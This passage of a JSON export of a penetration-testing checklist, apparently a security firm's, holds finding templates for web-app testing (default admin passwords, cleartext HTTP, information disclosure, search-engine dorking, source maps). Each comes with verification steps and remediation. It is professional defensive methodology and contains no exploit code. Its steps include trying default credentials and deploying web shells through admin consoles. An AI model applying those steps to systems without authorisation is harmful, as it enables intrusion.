pages.</p><p>ffuf can be used to brute force paths such as administrative login pages.</p>",
							"references": "<ul><li>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Disable external access to the administrative interface. Remote access to the interface should not be allowed directly. Instead, connections should be made via a bastion host, over a VPN connection, or through both.</p>"
						},
						"ordinal": 714,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "93529e79-7772-4f7d-a6a6-da382033d49d",
						"name": "Weak or Default Password - Web Administration ",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 162364,
							"uid": "161e3765-eb64-de11-a454-001e4f12001c",
							"name": "Weak or Default Password - Web Administration",
							"description": "<p>The affected web-based administration console either does not require authentication or is configured with an account that uses a default or weak password.</p><p>Default passwords are initially set by the software or device vendor when a product is sold. Weak passwords are passwords that can be easily guessed. Default and weak passwords are commonly found in environments where a password policy does not exist or is not being enforced.</p>",
							"severityId": 4,
							"businessImpact": "<p>Allowing weak and default passwords on accounts used to access administrative consoles may lead to the full compromise of the affected application and system. An attacker may use affected accounts to extract, modify, add, or delete configurations and information on the device.</p>",
							"sourceIdentifier": "M:162364",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>If admin pages are identified, search online for default credentials for the specific application. Try logging in to the administrative interface.</p><p>Try using the admin functionality to identify potential vulnerabilities but do not conduct any automated testing as an authenticated user against the admin functionality.</p><p>If administrative interface allows deployment of web content, try deploying web shells to the application and accessing those web shells.</p><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Show administrative login page</p></li><li><p>Show admin access</p></li><li><p>Show the level of access / admin functionality</p></li><li><p>If OS command execution is achieved, use the <strong>Post Exploitation checklist</strong> and add other findings as necessary</p></li><li><p>Include affected systems for each device type</p></li><li><p>Include the URL for each affected device</p></li></ol>",
							"references": "<ul><li>https://pages.nist.gov/800-63-3/sp800-63b.html </li></ul>",
							"exploitInstructions": "<p>big focus on application servers like cold fusion tomcat jboss etc</p><p>then onto any others</p><p>always worth it to try admin password</p><p>look at google for defaults for unknown apps if they are not custom</p>",
							"remediationInstructions": "<p>Ensure that the application enforces authentication, MFA, and strong passwords. In addition, if the console is available externally, evaluate the business need for external access.</p><p>Configure all accounts to use strong passwords. If a strong password policy has not been established, create one using the recommendations below as a guide. Password policies should include the following primary components:</p><ul><li><p>Password minimum length of twelve or more characters</p></li><li><p>Password complexity requirements that require each password contain three of the following: a lower-case letter, an upper-case letter, a number, a special character</p></li><li><p>Password cannot be the same as the username</p></li><li><p>Password cannot be a dictionary word</p></li></ul><p>Alternatively, the NIST publication describes how to create a strong password policy.</p><p>NIST Special Publication 800-63B: 5.1.1.2 Memorized Secret Verifiers: </p><ul><li><p>Length: 8 character minimum, &gt;64-character maximum</p></li><li><p>Compare new passwords to a dictionary and do not allow common, easily guessed passwords (such as password, abcd1234, etc.)</p></li><li><p>Compare new passwords to a list of known compromised passwords; do not allow the use of previously compromised passwords</p></li><li><p>Allow all printing ASCII and Unicode characters + spaces</p></li><li><p>Should offer option to show password rather than dots or asterisks; helps typing accuracy</p></li><li><p>Do not enforce composition rules (i.e., no &quot;passwords must include uppercase and lowercase letters, a number...&quot;, etc.); such rules provide a poor user experience</p></li><li><p>Do not use password hints; they weaken authentication</p></li><li><p>Do not expire passwords arbitrarily; regular expiration encourages users to choose easy-to-guess, less secure passwords</p></li><li><p>Do not use Knowledge-based Authentication (KBA)</p></li></ul>"
						},
						"ordinal": 715,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "46f041cf-4969-4db5-8890-2798316ada93",
						"name": "Vulnerable Libraries",
						"instructions": "<h3>Instructions:</h3><p><strong>This checklist task does not have an linked Finding</strong> because vulnerable libraries should each be called out separately. The reason is because the client may be able to fix some libraries and not others, which makes tracking of findings easier especially during remediation tests.</p><h3>Reporting:</h3><p>Within the description of the finding, include the link to either NIST (nist.gov) or cvedetails.com that includes the search criteria. For example:</p><p>https://nvd.nist.gov/vuln/search/results?form_type=Basic&amp;results_type=overview&amp;query=jquery&amp;search_type=all&amp;isCpeNameSearch=false</p><p>https://www.cvedetails.com/version-search.php?page=1&amp;vendor=&amp;product=bootstrap&amp;version=3.2.0</p><h3>Miscellaneous:</h3><ul><li><p>If a vulnerable library leads to a higher impact such as XSS, only call out the vulnerable version library not XSS. However the severity should be upgraded to the associated impact. For example, if Vulnerable Version - jQuery leads to reflected XSS, this would be upgraded to a Medium.</p></li></ul>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 716,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 7,
				"collapsed": true
			},
			{
				"uid": "87bab823-3361-4f95-97a0-0eff8b06bf86",
				"name": "Sensitive Data Exposure",
				"description": "",
				"type": 2,
				"tasks": [
					{
						"uid": "056c129d-c5af-4163-9645-fc3afd3dd099",
						"name": "Cleartext Protocol - HTTP",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17058625,
							"uid": "95d46951-a9f4-e511-80db-ecf4bbd04083",
							"name": "Cleartext Protocol - HTTP",
							"description": "<p>The service uses HTTP connections without necessary SSL/TLS protections resulting in unencrypted plaintext communications. As a result, sensitive information such as passwords, personal identifiable information, credit cards, and other confidential data may be viewed by an unauthorized user by passively monitoring network traffic.</p>",
							"severityId": 2,
							"businessImpact": "<p>An attacker who is able to successfully intercept HTTP traffic may gain access to sensitive information such as application credentials, thus compromising the confidentiality of application data. Additionally, the stolen credentials could be used in further attacks against the target system.</p>",
							"sourceIdentifier": "M:95d46951-a9f4-e511-80db-ecf4bbd04083",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Try connecting to the application using HTTP. This can be done by removing the S in HTTPS in a URL or by modifying the target within Burp Suite.</p><h3><strong>Reporting Requirements:</strong></h3><p>Add a statement in the Description explaining whether all application functionality or just some application functionality is available over HTTP.</p><ol><li><p>Click on the broken lock icon in the browser address bar and screen shot this drop down along with a portion of the application window.</p></li><li><p>Alternatively, use <code>curl</code> connecting to the application over HTTP.</p></li></ol><p>For Expens, only include this finding if the site includes some kind of sensitive information or user interaction. If the site allows login/password over HTTP, use the <code>Weak Configuration - Unencrypted HTTP Login</code> finding.</p>",
							"references": "<ul><li>http://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet#Secure_Server_Design</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Do not send sensitive information over HTTP connections. Any area of a website or web application that contains sensitive information or access to functionality that requires authentication should require HTTPS connections.</p>"
						},
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "31f14c59-1696-4bf7-bf8a-78c657a934c2",
						"name": "Information Disclosure - HTML Source Code",
						"instructions": "<p>Note that this finding is for reporting that sensitive information was disclosed via the HTML contents which are not visible on the webpage itself. For example, elements hidden by CSS, comments, etc. This finding is not intended to report the existing of source code within HTML.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 488456,
							"uid": "73627113-7cbf-de11-826f-001e4f120021",
							"name": "Information Disclosure - HTML Source Code",
							"description": "<p>The application includes sensitive information in the HTML source code. Unauthorized users may be able to access the source code locally while the page is loaded in a web browser, by intercepting network traffic, or by accessing the source code in local cache or proxy server.</p>",
							"severityId": 2,
							"businessImpact": "<p>An unauthorized user may be able to access the source code and use the information stored in the source code to facilitate unauthorized access to the application.</p>",
							"sourceIdentifier": "M:488456",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Review server responses for pages / functionality that display sensitive information that is not accessible to users via the GUI.</p><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Show application page / functionality that contains sensitive data in HTML source.</p></li><li><p>Include either highlighted request/response blocks from Burp, or a screenshot of the HTML source in browser.</p></li><li><p>Redact sensitive data as needed</p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Do not include any sensitive information in HTML source code.</p>"
						},
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "4e88fd94-a5b6-4437-83c5-ef18b1f7f023",
						"name": "Information Disclosure - Password in Server Response",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 5050191,
							"uid": "ffae1f61-cddc-e111-88b8-001e4f12001e",
							"name": "Information Disclosure - Password in Server Response",
							"description": "<p>A cleartext password is returned in a server response after a valid user has authenticated to the application. If a user leaves their computer unattended, a malicious user with physical access to the machine could recover the victim user's password from the browser.</p>",
							"severityId": 2,
							"businessImpact": "<p>Successful exploitation of the vulnerability could allow an attacker to authenticate to the application as the compromised user and view sensitive data or take actions as that user within the application.</p>",
							"sourceIdentifier": "M:010f7349-e8db-e111-ba7e-fbbef381998d",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Review server responses for disclosed passwords especially pages related authentication or user profile.</p><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Show application page / functionality that contains masked passwords</p></li><li><p>Show server response containing cleartext credentials</p></li><li><p>Redact credentials as needed</p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>The application should never return user credentials to the client. Change the application code to prevent it from returning any user passwords in server responses.</p>"
						},
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "744dad98-768b-4436-9262-6db2038c68d2",
						"name": "Information Disclosure - Social Security Numbers",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21349,
							"uid": "536e3712-62ba-dd11-b9f5-001e4f120030",
							"name": "Information Disclosure - Social Security Numbers",
							"description": "<p>Social security numbers (SSN) are disclosed by the application in cleartext. An attacker who gains unauthorized access to the application could also gain access to SSNs. Additionally, displaying sensitive information such as SSNs in cleartext increases the likelihood of a malicious individual to view this information either in person or through screen capturing software.</p>",
							"severityId": 2,
							"businessImpact": "<p>An attacker who could successfully intercept HTTP traffic may gain access to sensitive information thus compromising the confidentiality of application data. This, in turn, could have reputational consequences or lead to fines.</p>",
							"sourceIdentifier": "WI:10039",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Review application functionality to determine if complete SSNs are available to application users. Use this finding if  SSNs are returned by the application when they do not necessarily serve a business purpose. If SSNs are displayed but it appears to be a business requirement (for example for healthcare patient data), use the <code>Information Disclosure - Unmasked Social Security Number</code> instead.</p><h3><strong>Reporting Requirements:</strong></h3><ul><li><p>Screenshot application functionality that displays complete SSNs - redact SSNs except for the last four digits</p></li></ul>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Verify whether access to Social Security Numbers is required for a specific business purpose. When sensitive data such as SSNs needs to be available within the web application, mask part of the data so that the information is not fully disclosed. For example: &#42;&#42;&#42;-&#42;&#42;-1234.</p><p>If a user needs to be able to access complete SSNs, they should be initially masked but the application should include functionality that allows access to unmasked SSNs, for example by clicking the masked Social Security Number. The functionality that allows unmasking SSNs should be accessible only to users who have a business need to access SSNs.</p>"
						},
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "0d63bad6-cb91-4966-8cf1-aa4b78156e0d",
						"name": "Information Disclosure - Unmasked Social Security Number",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17058623,
							"uid": "8e23457e-a2f4-e511-80db-ecf4bbd04083",
							"name": "Information Disclosure - Unmasked Social Security Number",
							"description": "<p>The application does not mask social security numbers and displays complete numbers.</p>",
							"severityId": 1,
							"businessImpact": "<p>Social security numbers could be used to facilitate identity theft.  If an incident were to occur, monetary loss could be incurred due to fines, penalties, and brand damage.</p>",
							"sourceIdentifier": "M:8e23457e-a2f4-e511-80db-ecf4bbd04083",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Review application functionality to determine if complete SSNs are displayed to users. This finding is intended to be used when single SSNs are displayed for apparent business requirement (for example for healthcare patient data).</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Screenshot page containing complete SSN - redact SSN except for the last four digits</p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>A policy of need-to-know should be followed for any sensitive personal information, and social security numbers returned to the client should be masked by default. If a user needs to be able to access complete SSNs, they should be initially masked but the application should include functionality that allows access to unmasked SSNs, for example by clicking the masked social security number. The functionality that allows unmasking SSNs should be accessible only to users who have a business need to access SSNs.</p>"
						},
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "2b1e93ff-bbcf-46f7-abf0-b8b7f7669c94",
						"name": "Information Disclosure - Database Error Message",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 781,
							"uid": "e935944e-03b1-dd11-992f-001e4f120030",
							"name": "Information Disclosure - Database Error Message",
							"description": "<p>A database error message was discovered in the application. Certain conditions, such as an application not handling unexpected user input correctly, can cause database server error messages to be displayed to the user. Database error messages display sensitive information that may allow an attacker to determine information that can be used to research further attacks, such as the type and version of the database in use, database table names and content, and the type and version of software used to connect to the database.</p><p>An attacker could analyze the application's behavior by submitting different inputs to the server. Based on the database error messages, an attacker could be able to identify other potential weaknesses in the application, such as SQL injection vulnerabilities.</p>",
							"severityId": 2,
							"businessImpact": "<p>The severity of this vulnerability depends on the information included within the error message, as well as what information can be gained by analyzing what causes the error message to appear.  Exposing sensitive information within error messages compromises the confidentiality of the affected system. If the error message can be leveraged to perform a successful SQL injection attack, this would result in the compromise of the confidentiality and integrity of the information within the associated database.</p>",
							"sourceIdentifier": "GID:3139",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>If the finding is from automated scans, review the information from the scan to determine if it is a valid database error message (rather than a false positive based on a manual page, etc.).</p><p>After determining what input triggered the error initially, recreate the error using a browser or Burp.</p><p>If the error was triggered through a parameter, ensure that the vulnerable parameter is documented in  Instance Details. </p><p>Investigate further with additional input to determine if SQL injection is possible. (see SQL injection for additional information).</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Show the initial page / request and response</p></li><li><p>Show the injection that causes the database error in an HTTP request</p></li><li><p>Show/Highlight the error message in the HTTP response</p></li><li><p>If SQL injection is not possible, add an explanation regarding that in the Instance Details</p></li></ol>",
							"references": "<ul><li>https://cwe.mitre.org/data/definitions/209.html</li><li>https://owasp.org/www-community/Improper_Error_Handling</li><li>https://owasp.org/Top10/A03_2021-Injection/</li></ul>",
							"exploitInstructions": "<p>Investigate further with additional input to determine if SQL injection is possible. (see SQL injection for additional information).</p>",
							"remediationInstructions": "<p>Design and add consistent error-handling mechanisms that can handle any user input to the web application and provide meaningful detail to end-users. Error messages should be generic. Do not display verbose error messages that might provide sensitive information such as database names, table names, database versions, and installed software.</p>"
						},
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d834af59-36e6-4642-bfa3-45402a2994f1",
						"name": "Information Disclosure - Verbose Error Message",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17058624,
							"uid": "c6e192e5-a6f4-e511-80db-ecf4bbd04083",
							"name": "Information Disclosure - Verbose Error Message",
							"description": "<p>The application returns verbose error messages. Verbose error messages may contain sensitive information such as the type and version of software in use on the server, application code, internal host names, or server paths that should not be returned to the end user.</p>",
							"severityId": 1,
							"businessImpact": "<p>Knowing whether certain inputs trigger a server error can aid or inform an attacker of potential vulnerabilities. Additionally, information disclosed in detailed error messages may allow further attacks against the target environment.</p>",
							"sourceIdentifier": "M:c6e192e5-a6f4-e511-80db-ecf4bbd04083",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Review application responses to determine if verbose error messages are returned to users.  The information disclosed via the error message should be specific enough to allow an attacker to infer additional information about the system that would otherwise be unavailable. For example, an error saying: &quot;The input does not meet the expected format: [A-z]{1,50}&quot; is not verbose, even though it has a regular expression. A message that includes a stack trace, library name, file path, host name, application code, etc would be considered verbose.  </p><p><strong>Reporting Requirements</strong></p><ol><li><p>If verbose errors are displayed throughout the application, add a statement that verbose error messages should be disabled throughout the application</p></li><li><p>Screenshot a sample error message</p></li></ol>",
							"references": "<ul><li>https://wiki.owasp.org/index.php/Testing_for_Error_Code_(OTG-ERR-001) </li></ul>",
							"exploitInstructions": "<p><<NULL>></p>",
							"remediationInstructions": "<p>Design generic error handling mechanisms that can handle any user input to the web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed. Do not display stack traces or other detailed errors to end users.</p>"
						},
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "7ee1b9a7-1eeb-4516-8b73-236747a1d19a",
						"name": "Information Disclosure - Robots.txt",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 509,
							"uid": "4c32944e-03b1-dd11-992f-001e4f120030",
							"name": "Information Disclosure - Robots.txt",
							"description": "<p>Robots.txt files are intended to prevent automated web spiders from accessing certain directories on a web site for maintenance or indexing purposes. A malicious user may be able to use the contents of this file to learn the location of sensitive documents or directories on the affected site and either retrieve them directly or target them for other attacks.</p>",
							"severityId": -2,
							"businessImpact": "<p>An attacker can learn of directories containing potentially sensitive information by investigating the contents of the robots.txt file.</p>",
							"sourceIdentifier": "GID:2012",
							"verificationInstructions": "<p>Review the contents of robots.txt. While robots.txt by itself is not a finding, robots.txt contents can sometimes be used to identify \"hidden\" application functionality such as administrative pages. Manually review all interesting content, then test and report the identified functionality using normal findings.</p><p>Report this finding if there are any sensitive or vulnerable pages exposed by the robots.txt page.</p>",
							"references": "<ul><li>http://www.robotstxt.org/wc/exclusion.html</li></ul>",
							"exploitInstructions": "<p>Burp will automatically parse the robots.txt file when it finds it, filling out the sitemap for the application. Additionally, it'll include an informational finding with the response from the server. You can review the response here, or browse to the file directly.</p><p>Assemble a list of urls from the entries of the file and pass this file to Dirbuster or Burp Suite Intruder; review the responses for anything interesting.</p>",
							"remediationInstructions": "<p>Review the contents of the site's robots.txt file, use Robots META tags instead of entries in the robots.txt file, and adjust the web server's access controls to limit access to sensitive material.</p>"
						},
						"ordinal": 7,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "5573b7bb-2fc7-4b78-be80-8fc5c523d041",
						"name": "Information Disclosure - Server Path",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 825,
							"uid": "4f36944e-03b1-dd11-992f-001e4f120030",
							"name": "Information Disclosure - Server Path",
							"description": "<p>A fully qualified path name was discovered. This most often occurs in context of an error produced by the web application or when path names are left within comments.</p>",
							"severityId": 1,
							"businessImpact": "<p>Fully qualified server path names allow an attacker to identify the file system structure of the web server, which can be used as a baseline when planning future attacks.</p>",
							"sourceIdentifier": "GID:2386",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Review application responses to determine if server paths are returned to users. Server paths in error messages should be reported as <strong>Information Disclosure - Verbose Error Message</strong>. This finding is intended to be used if server paths are disclosed in a location <u>other than</u> a verbose error message.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Show application functionality / server response that discloses server paths</p></li></ol>",
							"references": "<ul><li>http://www.owasp.org/index.php/Full_Path_Disclosure</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>If the path exists in comments within the files, remove all path names from any comments. If the path exists in an error message, design and add consistent error handling mechanisms that can handle any user input to the web application, provide meaningful detail to end-users, and prevent error messages that might provide information useful to an attacker from being displayed.</p>"
						},
						"ordinal": 8,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "9b2abd28-d298-4181-ad14-b788db694688",
						"name": "Information Disclosure - Internal IP Address",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 795,
							"uid": "0336944e-03b1-dd11-992f-001e4f120030",
							"name": "Information Disclosure - Internal IP Address",
							"description": "<p>A string matching an internal IP address was discovered. This discloses information about the IP addressing scheme of the internal network and can be valuable to attackers.</p>",
							"severityId": 1,
							"businessImpact": "<p>Information disclosure vulnerabilities reveal sensitive information about a system or web application to an attacker. An attacker can use this information to learn more about a system when attempting to gain unauthorized access.</p>",
							"sourceIdentifier": "GID:2137",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Review application functionality / server responses to determine if internal IP addresses are returned to users. </p><p>Some application display internal IP addresses for a defined business requirement (such as application configurations etc.). Do not report internal IP address disclosure unless it's unintentional. Also, do not report internal IP disclosure for internal applications.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Screenshot the internal IP that was disclosed</p></li></ol>",
							"references": "<ul><li>http://projects.webappsec.org/Information-Leakage</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>This issue can appear for several reasons. The most common is that the application or error message from the web server discloses the IP address. This can be solved by determining where to turn off detailed error messages in the application or web server. Another common reason is due to a comment located in the source of the web page. This can easily be removed from the source of the page.</p>"
						},
						"ordinal": 9,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "ebcdeb82-4938-4629-b585-95b31c08e823",
						"name": "Sensitive Information Disclosure - Server Response",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17056267,
							"uid": "176ca4b8-f25a-e511-80d2-ecf4bbd04073",
							"name": "Sensitive Information Disclosure - Server Response",
							"description": "<p>Sensitive information was found in the server response. By looking at the raw response data, an attacker could see information that was not meant to be seen by users.</p>",
							"severityId": 2,
							"businessImpact": "<p>An attacker could gain unauthorized access to sensitive data. This data could be used in potential attacks against the application.</p>",
							"sourceIdentifier": "M:176ca4b8-f25a-e511-80d2-ecf4bbd04073",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Review server responses to identify sensitive data that should not be available to users.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Add an explanation what kind of data was identified in server responses</p></li><li><p>Screenshot server response - redact sensitive data if needed</p></li></ol>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that sensitive information that users are not supposed to access is not returned in server responses.</p>"
						},
						"ordinal": 10,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d24214e9-8931-4361-857a-54dfce026413",
						"name": "Sensitive Information Disclosure - Email Headers",
						"instructions": "<h3>Instructions:</h3><p>If the application sends an email to securitytesting@netspi.com as part of the enrollment, password reset functionality, or similar, check the email headers to see if any sensitive information is being disclosed.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17094902,
							"uid": "25e0c2cf-7247-4400-bc72-49a43aa466ed",
							"name": "Sensitive Information Disclosure - Email Header",
							"description": "<p>Sensitive information was found in the headers of the email sent by the application or by the email infrastructure upon which the application relies.</p>",
							"severityId": 2,
							"businessImpact": "<p>Depending on the sensitivity of the information, its disclosure could compromise the confidentiality of the system. Alternatively, an attacker could leverage the information to attacks against other areas of the application or infrastructure.</p>",
							"sourceIdentifier": "M:25e0c2cf-7247-4400-bc72-49a43aa466ed",
							"verificationInstructions": "<h3>Verification Instructions:</h3><p>If the application includes some type of email functionality such as an enrollment or password reset which sends an email to <a href='mailto:securitytesting@netspi.com'>securitytesting@netspi.com</a>, check the email headers to see if any sensitive information (e.g., SMTP password) is disclosed.</p><h3>Reporting Requirements:</h3><ol><li><p>Show the application functionality that is used to send the email, such as &quot;forgot password&quot; functionality</p></li><li><p>Show the received email and the email headers</p></li><li><p>Highlight the sensitive information in the email headers; redact information as needed</p></li></ol>",
							"references": null,
							"exploitInstructions": null,
							"remediationInstructions": "<p>Ensure both the application and the email server infrastructure are configured to not disclose sensitive information in the email metadata or headers.</p>"
						},
						"ordinal": 11,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "a197d5ab-d329-40c7-b231-dd0e3b62f84d",
						"name": "Information Disclosure - Search Engines",
						"instructions": "<h3>Instructions:</h3><p>Use search engines in an attempt to identify site content that does not require authentication or has been indexed but might not be normally available via the application.</p><p><em>site: </em>www.netspi.com - Limits a search requests to certain domain</p><p><em>filetype:xml</em> site:www.netspi.com - Look for specific filetypes, such as pdf, docx, xml, xlsx, txt</p><p><em>inurl:/wp-content/</em> site:www.netspi.com - Search for URL strings</p><p><em>intitle: admin</em> site:www.netspi.com - Search for string in page content such as title</p><h3>Further Review:</h3><p>If you construct a list of URLs from the Google search results, you can pass it to gowitness to get a quick set of screenshots</p><h3>Reference:</h3><p>This is referred to as 'Google Dorking.' See the Google Hacking Database (GHDB) has useful pre-constructed searches while Wikipedia has a listing of useful operators.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063346,
							"uid": "9227d6a2-d23d-e811-80fe-ecf4bbd04073",
							"name": "Information Disclosure - Publicly Available Resources",
							"description": "<p>Non-public company information was found in files associated with a publicly accessible resource.  Common examples include email addresses, usernames, internal domain information, confidential documents, and passwords.</p>",
							"severityId": 1,
							"businessImpact": "<p>An attacker with access to internal non-public information could use it to launch other attacks against the environment.</p>",
							"sourceIdentifier": "M:d65ed356-3b84-4b76-b02a-ea5a426c62cd",
							"verificationInstructions": "",
							"references": "<ul><li>https://help.archive.org/help/how-do-i-request-to-remove-something-from-archive-org/</li><li>https://blog.google/products/search/new-options-for-removing-your-personally-identifiable-information-from-search/</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that internal usernames, domain information and other sensitive data are not accessible to unauthenticated internet users via publicly accessible resources.  Consider removing, redacting, or making the affected resources private.</p><p>If the resource is a 3rd party, reach out to the service hosting the outdated or sensitive content.</p><p>For the Wayback Machine, use the Internet Archive's removal request process. Provide them with detailed information about the content and why it needs to be removed or updated.</p><p>If sensitive information is indexed by search engines, submit a removal request to each search engine. Google, Bing, and others have processes for requesting the removal of personal information or content under certain conditions.</p><p>In cases where the third-party service does not comply or the process is not straightforward, consider legal advice to understand the options for enforcing the removal of sensitive information under applicable laws, such as GDPR in Europe or CCPA in California.</p>"
						},
						"ordinal": 12,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "6c1fd079-450f-4d96-b59a-b8cc329daeef",
						"name": "Information Disclosure - JavaScript Sourcemap",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 1000028726,
							"uid": "c351375b-8f3b-47fd-9766-4c005d12f6d9",
							"name": "Information Disclosure - Sourcemap",
							"description": "<p>Source map files (.map) are used during development to map minified or obfuscated JavaScript back to its original source code, making debugging easier for developers. When exposed in production environments, these files can provide attackers with insight into the application's structure, logic, and implementation details. While source map exposure does not directly compromise the system, it lowers the barrier for attackers to attack the application. Source maps may contain sensitive information not included in the minified code, such as comments, unused functions, or development-only configurations, further increasing the risk.</p>",
							"severityId": 1,
							"businessImpact": "<p>Exposed source map files increase the ease with which attackers can locate and exploit vulnerabilities in an application. By revealing the original, unminified source code, these files provide a detailed view of the application's logic, configuration, and potentially sensitive information. Attackers can use this information to identify API endpoints, bypass client-side validation, or locate vulnerable code.</p>",
							"sourceIdentifier": "M:c351375b-8f3b-47fd-9766-4c005d12f6d9",
							"verificationInstructions": "<p>Attempt to load the .map file for minimized javascript, for example if you see  app.min.js, try to access app.min.js.map.</p><p>If any particularly sensitive information is included in the map file such as API keys, debug/QA/Staging environment details consider increasing severity if it merits changing of CVSS values. </p><p>Additionally, look for<pre><code> //&#35; sourceMappingURL </code></pre>in javascript files or the <code>SourceMap</code> HTTP header</p>",
							"references": null,
							"exploitInstructions": null,
							"remediationInstructions": "<p>To prevent source map exposure, ensure that .map files are not deployed to production environments. Disable source map generation in production builds by updating the build tool configuration. If source maps are required for debugging in production, access should be restricted.</p>"
						},
						"ordinal": 13,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 8,
				"collapsed": true
			},
			{
				"uid": "f5598135-c594-4295-a0b3-218c280e7567",
				"name": "Application Functionality",
				"description": null,
				"type": 2,
				"tasks": [
					{
						"uid": "ca6393b3-09f9-4041-8543-fb0c79afc45e",
						"name": "File Upload - Unvalidated File Allowed*",
